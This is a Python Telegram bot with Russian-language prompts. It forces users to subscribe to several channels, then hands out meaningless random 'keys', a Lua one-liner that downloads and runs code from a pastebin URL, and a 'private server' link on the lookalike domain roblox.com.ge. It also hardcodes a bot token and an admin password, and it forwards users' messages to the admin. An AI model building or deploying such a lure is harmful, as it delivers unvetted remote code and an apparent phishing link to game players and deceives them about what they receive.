import telebot
import random
from telebot import types
import sqlite3
import os
import socket
from threading import Thread

TOKEN = os.environ.get("TOKEN", "8793302361:AAHCxbHJ6v_oCyjHqiafsHHaf7Xr1EvkDO8")
ADMIN_ID = 8091608667
ADMIN_SECRET = "larscriptkryyyyyyt"

DB_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_users.db")

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)")
    conn.commit()
    conn.close()

def add_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
    exists = c.fetchone()
    if not exists:
        c.execute("INSERT INTO users VALUES (?)", (user_id,))
        conn.commit()
        conn.close()
        return True
    conn.close()
    return False

def get_all_users():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = [row[0] for row in c.fetchall()]
    conn.close()
    return users

def count_users():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    count = c.fetchone()[0]
    conn.close()
    return count

def remove_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM users WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

init_db()

CHANNELS = [
    {"name": "freprivatka34", "url": "https://t.me/freprivatka34"},
    {"name": "freegodlymm2_67", "url": "https://t.me/freegodlymm2_67"},
    {"name": "keyscripts3", "url": "https://t.me/keyscripts3"}
]

KEYS = ["МОПС", "СКИТ", "ТАКСА", "КИТ", "LARS", "MOPS", "ARDOR", "MALTUIPY"]

PRIVATE_SERVER_LINK = "https://roblox.com.ge/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844"
SCRIPT_LINK = "loadstring(game:HttpGet(\"https://pastebin.com/raw/GdQULgA6\"))()"

MESSAGES = {
    "start": "😌 Чтобы продолжить пользоваться ботом, пожалуйста, выполни следующие задания!",
    "not_subscribed": "📢 Подпишитесь на каналы для получения скрипта и ключа",
    "not_all_subs": "❌ Вы не подписаны на все каналы!"
}

PHOTOS = {
    "start": None,
    "not_subscribed": None
}

bot = telebot.TeleBot(TOKEN)

def notify_admin(text):
    try:
        bot.send_message(ADMIN_ID, text, parse_mode="Markdown")
    except:
        pass

def is_admin(user_id):
    return user_id == ADMIN_ID

def get_unsubscribed_channels(user_id):
    not_subbed = []
    for ch in CHANNELS:
        try:
            member = bot.get_chat_member(f"@{ch['name']}", user_id)
            if member.status not in ["member", "administrator", "creator"]:
                not_subbed.append(ch)
        except:
            not_subbed.append(ch)
    return not_subbed

def get_channels_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for ch in CHANNELS:
        keyboard.add(types.InlineKeyboardButton(
            text=f"Подписаться ✅ {ch['name']}",
            url=ch['url']
        ))
    keyboard.add(types.InlineKeyboardButton(
        text="🔍 Проверить подписку",
        callback_data="check_sub"
    ))
    return keyboard

def get_unsub_keyboard(not_subbed):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for ch in not_subbed:
        keyboard.add(types.InlineKeyboardButton(
            text=f"Подписаться ❎ {ch['name']}",
            url=ch['url']
        ))
    keyboard.add(types.InlineKeyboardButton(
        text="🔍 Проверить снова",
        callback_data="check_sub"
    ))
    return keyboard

def get_success_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(types.InlineKeyboardButton(
        text="📜 Скрипт на все игры",
        callback_data="get_script"
    ))
    keyboard.add(types.InlineKeyboardButton(
        text="🔑 Ключ",
        callback_data="get_key"
    ))
    keyboard.add(types.InlineKeyboardButton(
        text="🔒 Приватный сервер MM2",
        callback_data="get_private"
    ))
    return keyboard

def get_admin_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("📝 Приветствие", callback_data="admin_edit_start"),
        types.InlineKeyboardButton("📢 Не подписан", callback_data="admin_edit_notsub")
    )
    keyboard.add(
        types.InlineKeyboardButton("🖼 Фото старт", callback_data="admin_photo_start"),
        types.InlineKeyboardButton("➕ Канал", callback_data="admin_add_channel")
    )
    keyboard.add(
        types.InlineKeyboardButton("➖ Канал", callback_data="admin_del_channel"),
        types.InlineKeyboardButton("📋 Каналы", callback_data="admin_list_channels")
    )
    keyboard.add(
        types.InlineKeyboardButton("🔑 Ключи", callback_data="admin_list_keys"),
        types.InlineKeyboardButton("🔑 Изменить ключи", callback_data="admin_edit_keys")
    )
    keyboard.add(
        types.InlineKeyboardButton("📨 Рассылка", callback_data="admin_broadcast"),
        types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")
    )
    keyboard.add(
        types.InlineKeyboardButton("👥 Пользователи", callback_data="admin_users_list"),
        types.InlineKeyboardButton("🚫 Удалить юзера", callback_data="admin_del_user")
    )
    keyboard.add(
        types.InlineKeyboardButton("📨 Личное сообщение", callback_data="admin_pm"),
        types.InlineKeyboardButton("🔗 Изменить ссылку", callback_data="admin_edit_link")
    )
    return keyboard

@bot.message_handler(func=lambda m: not m.text.startswith("/") and m.text != ADMIN_SECRET and m.from_user.id != ADMIN_ID)
def catch_messages(message):
    user = message.from_user
    text = f"💬 *Новое сообщение в боте*\n\n👤 {user.first_name}"
    if user.username:
        text += f" (@{user.username})"
    text += f"\n🆔 `{user.id}`\n\n📩 *Сообщение:* {message.text}"
    notify_admin(text)

@bot.message_handler(commands=["start"])
def start(message):
    is_new = add_user(message.from_user.id)
    if is_new:
        user = message.from_user
        text = f"🆕 *Новый пользователь!*\n\n🆔 ID: `{user.id}`\n👤 Имя: {user.first_name}\n📛 Username: @{user.username if user.username else 'нет'}\n👥 Всего пользователей: {count_users()}"
        notify_admin(text)
    if PHOTOS["start"]:
        bot.send_photo(message.chat.id, PHOTOS["start"], caption=MESSAGES["start"], reply_markup=get_channels_keyboard())
    else:
        bot.send_message(message.chat.id, MESSAGES["start"], reply_markup=get_channels_keyboard())

@bot.message_handler(commands=["getkey"])
def getkey(message):
    add_user(message.from_user.id)
    not_subbed = get_unsubscribed_channels(message.from_user.id)
    if not not_subbed:
        key = random.choice(KEYS)
        bot.send_message(message.chat.id, f"🎉 Подписка подтверждена!\n\n🔑 Твой ключ: {key}")
    else:
        if PHOTOS["not_subscribed"]:
            bot.send_photo(message.chat.id, PHOTOS["not_subscribed"], caption=MESSAGES["not_subscribed"], reply_markup=get_unsub_keyboard(not_subbed))
        else:
            bot.send_message(message.chat.id, MESSAGES["not_subscribed"], reply_markup=get_unsub_keyboard(not_subbed))

@bot.message_handler(func=lambda m: m.text == ADMIN_SECRET)
def admin_panel(message):
    if not is_admin(message.from_user.id):
        return
    text = f"🛡 *Админ панель*\n\n👥 Пользователей: {count_users()}\n📊 Каналов: {len(CHANNELS)}\n🔑 Ключей: {len(KEYS)}\n\nВыбери действие:"
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=get_admin_keyboard())

@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
def admin_callback(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "❌ Нет доступа.")
        return
    action = call.data
    if action == "admin_stats":
        text = f"📊 *Статистика:*\n👥 Всего пользователей: {count_users()}\n📊 Каналов: {len(CHANNELS)}\n🔑 Ключей: {len(KEYS)}"
        bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
    elif action == "admin_users_list":
        users = get_all_users()
        if not users:
            text = "👥 Пользователей пока нет."
        else:
            text = f"👥 *Список пользователей ({len(users)}):*\n\n"
            for uid in users[:50]:
                text += f"• `{uid}`\n"
            if len(users) > 50:
                text += f"\n... и ещё {len(users) - 50}"
        bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
    elif action == "admin_del_user":
        msg = bot.send_message(call.message.chat.id, "🚫 Введи ID пользователя которого хочешь удалить:")
        bot.register_next_step_handler(msg, del_user_by_id)
    elif action == "admin_pm":
        msg = bot.send_message(call.message.chat.id, "📨 Введи ID пользователя и сообщение:\nФормат: ID текст сообщения")
        bot.register_next_step_handler(msg, send_pm)
    elif action == "admin_list_channels":
        text = "📋 *Список каналов:*\n" + "\n".join(f"• @{ch['name']}" for ch in CHANNELS)
        bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
    elif action == "admin_list_keys":
        text = "🔑 *Список ключей:*\n" + "\n".join(f"• {k}" for k in KEYS)
        bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
    elif action == "admin_edit_keys":
        msg = bot.send_message(call.message.chat.id, "🔑 Введи новые ключи через запятую:")
        bot.register_next_step_handler(msg, save_keys)
    elif action == "admin_edit_link":
        msg = bot.send_message(call.message.chat.id, "🔗 Введи новую ссылку на приватный сервер:")
        bot.register_next_step_handler(msg, save_link)
    elif action == "admin_edit_start":
        msg = bot.send_message(call.message.chat.id, "📝 Введи новый текст для приветствия:")
        bot.register_next_step_handler(msg, save_message, "start")
    elif action == "admin_edit_notsub":
        msg = bot.send_message(call.message.chat.id, "📢 Введи новый текст для неподписанных:")
        bot.register_next_step_handler(msg, save_message, "not_subscribed")
    elif action == "admin_photo_start":
        msg = bot.send_message(call.message.chat.id, "🖼 Отправь фото для приветствия (или /skip):")
        bot.register_next_step_handler(msg, save_photo, "start")
    elif action == "admin_add_channel":
        msg = bot.send_message(call.message.chat.id, "➕ Введи данные канала:\nимя_канала | ссылка")
        bot.register_next_step_handler(msg, add_channel)
    elif action == "admin_del_channel":
        text = "➖ Выбери канал для удаления:"
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        for i, ch in enumerate(CHANNELS):
            keyboard.add(types.InlineKeyboardButton(f"❌ @{ch['name']}", callback_data=f"admin_del_{i}"))
        bot.send_message(call.message.chat.id, text, reply_markup=keyboard)
    elif action.startswith("admin_del_"):
        idx = int(action.replace("admin_del_", ""))
        if 0 <= idx < len(CHANNELS):
            deleted = CHANNELS.pop(idx)
            bot.send_message(call.message.chat.id, f"✅ Канал @{deleted['name']} удалён.")
    elif action == "admin_broadcast":
        msg = bot.send_message(call.message.chat.id, f"📨 Введи текст рассылки (получат {count_users()} чел.):")
        bot.register_next_step_handler(msg, broadcast_step1)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data in ["check_sub", "get_script", "get_key", "get_private"])
def user_callback(call):
    action = call.data
    
    if action == "check_sub":
        not_subbed = get_unsubscribed_channels(call.from_user.id)
        if not not_subbed:
            text = "✅ *Подписка подтверждена!*\n\nВыбери что хочешь получить:"
            bot.send_message(call.message.chat.id, text, parse_mode="Markdown", reply_markup=get_success_keyboard())
        else:
            text = "❌ Осталось подписаться:\n\n"
            for ch in not_subbed:
                text += f"❎ {ch['name']}\n"
            bot.send_message(call.message.chat.id, text, reply_markup=get_unsub_keyboard(not_subbed))
    
    elif action == "get_script":
        text = f"📜 *Скрипт на все игры:*\n\n```lua\n{SCRIPT_LINK}\n```"
        bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
        bot.answer_callback_query(call.id, "Скрипт отправлен!")
    
    elif action == "get_key":
        key = random.choice(KEYS)
        text = f"🔑 *Твой ключ:*\n\n`{key}`\n\nСкопируй и вставь в скрипт."
        bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
        bot.answer_callback_query(call.id, "Ключ отправлен!")
    
    elif action == "get_private":
        text = f"🔒 *Приватный сервер MM2*\n\n{PRIVATE_SERVER_LINK}"
        bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
        bot.answer_callback_query(call.id, "Приватка отправлена!")

def del_user_by_id(message):
    try:
        uid = int(message.text.strip())
        remove_user(uid)
        bot.send_message(message.chat.id, f"✅ Пользователь {uid} удалён.")
    except:
        bot.send_message(message.chat.id, "❌ Неверный ID.")

def send_pm(message):
    try:
        parts = message.text.split(" ", 1)
        uid = int(parts[0])
        text = parts[1]
        bot.send_message(uid, f"📨 *Сообщение от администратора:*\n\n{text}", parse_mode="Markdown")
        bot.send_message(message.chat.id, f"✅ Отправлено пользователю {uid}")
    except:
        bot.send_message(message.chat.id, "❌ Неверный формат.")

def save_keys(message):
    global KEYS
    KEYS = [k.strip() for k in message.text.split(",")]
    bot.send_message(message.chat.id, f"✅ Ключи обновлены!")

def save_link(message):
    global PRIVATE_SERVER_LINK
    PRIVATE_SERVER_LINK = message.text.strip()
    bot.send_message(message.chat.id, f"✅ Ссылка обновлена!")

def save_message(message, msg_type):
    MESSAGES[msg_type] = message.text
    bot.send_message(message.chat.id, "✅ Сообщение обновлено!")

def save_photo(message, msg_type):
    if message.content_type == "photo":
        PHOTOS[msg_type] = message.photo[-1].file_id
        bot.send_message(message.chat.id, "✅ Фото сохранено!")
    elif message.text == "/skip":
        PHOTOS[msg_type] = None
        bot.send_message(message.chat.id, "✅ Фото убрано.")

def add_channel(message):
    try:
        name, url = message.text.split("|")
        CHANNELS.append({"name": name.strip().replace("@", ""), "url": url.strip()})
        bot.send_message(message.chat.id, f"✅ Канал добавлен!")
    except:
        bot.send_message(message.chat.id, "❌ Неверный формат.")

def broadcast_step1(message):
    if message.text != "/skip":
        MESSAGES["broadcast_text"] = message.text
    msg = bot.send_message(message.chat.id, "🖼 Отправь фото для рассылки (или /skip):")
    bot.register_next_step_handler(msg, broadcast_step2)

def broadcast_step2(message):
    photo_id = None
    if message.content_type == "photo":
        photo_id = message.photo[-1].file_id
    elif message.text != "/skip":
        bot.send_message(message.chat.id, "❌ Отправь фото или /skip")
        return
    users = get_all_users()
    text = MESSAGES.get("broadcast_text", "")
    count = 0
    for uid in users:
        try:
            if photo_id:
                bot.send_photo(uid, photo_id, caption=text)
            else:
                bot.send_message(uid, text)
            count += 1
        except:
            pass
    bot.send_message(message.chat.id, f"✅ Отправлено: {count}/{len(users)}")

def run_server():
    port = int(os.environ.get("PORT", 10000))
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port))
    s.listen(1)
    print(f"Port {port} opened")
    while True:
        c, _ = s.accept()
        c.send(b"HTTP/1.1 200 OK\r\n\r\nBot running")
        c.close()

Thread(target=run_server).start()
bot.polling()
